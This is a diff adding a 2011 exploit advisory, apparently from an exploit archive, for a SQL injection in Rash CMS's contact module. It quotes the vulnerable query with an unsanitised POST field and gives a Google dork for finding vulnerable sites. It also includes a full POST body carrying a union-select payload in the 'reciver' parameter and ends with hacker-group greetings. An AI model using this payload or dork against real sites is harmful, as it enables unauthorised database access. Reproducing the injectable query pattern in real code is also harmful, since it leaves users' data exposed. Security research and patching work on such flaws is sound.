@@ -1,0 +1,43 @@
+==========================================
+Rash CMS SQL Injection Vulnerability
+==========================================
+
+[~]######################################### InformatioN
+#############################################[~]
+
+[~] Title     : Rash CMS SQL Injection Vulnerability
+[~] Author    : keracker
+[~] Vendor or Software Link  : http://rashcms.com
+[~] Email     : keracker@gmail.com
+[~] Data  : 2011-04-01
+[~] Google dork: ":: RashCMS :: - :: MihanPHP ::"
+[~] Category:  [Webapps]
+[~] Tested on: [Windows /php]
+
+[~]#########################################   ExploiT
+#############################################[~]
+
+[~] Vulnerable File :
+
+http://127.0.0.1/module/contact/contact-config.php
+ LINE: 54
+ CODE:
+ $q = $d->getrows("SELECT `u_id` FROM `permissions` WHERE
+`access_admin_area`='1' AND `u_id`=$_POST[reciver]",true);
+
+  go to
+ http://127.0.0.1/index.php?module=contact
+
+ You have to post injection code in "reciver"
+ you can use LIVE HTTP HEADERS firefox addone to exploit it
+ like this:
+ name=%D8%B4&email=a%40d.com&site=s&tell=1234567&reciver=-1+union+all+select+version()--&text=aaaaaaa&RashCMS=777577&submit=%D8%A7%D8%B1%D8%B3%D8%A7%D9%84+%D9%BE%DB%8C%D8%A7%D9%85
+Demo:
+ http://intrepidrealty.net/rashcms.GIF
+[~]######################################### ThankS To ...
+############################################[~]
+
+[~] IRANIAN Young HackerZ # Persian Gulf
+
+[~]#########################################   FinisH :D
+#############################################[~]################[~]
